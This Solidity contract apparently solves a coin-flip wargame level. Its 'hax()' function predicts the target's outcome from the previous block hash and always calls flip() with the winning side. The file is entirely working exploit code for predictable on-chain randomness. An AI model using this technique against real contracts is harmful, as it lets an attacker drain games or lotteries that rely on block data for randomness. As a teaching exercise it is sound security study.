pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';
import "./CoinFlip.sol";

contract Blockerman {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlip;
    constructor() {
        coinFlip = CoinFlip(0x69C9B742dcfEd2713550b9F8fA6f24B33442D7d2);
    }

    function hax() public{
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 guess = blockValue.div(FACTOR);
        bool side = guess == 1 ? true : false;
        coinFlip.flip(side);
    } 
}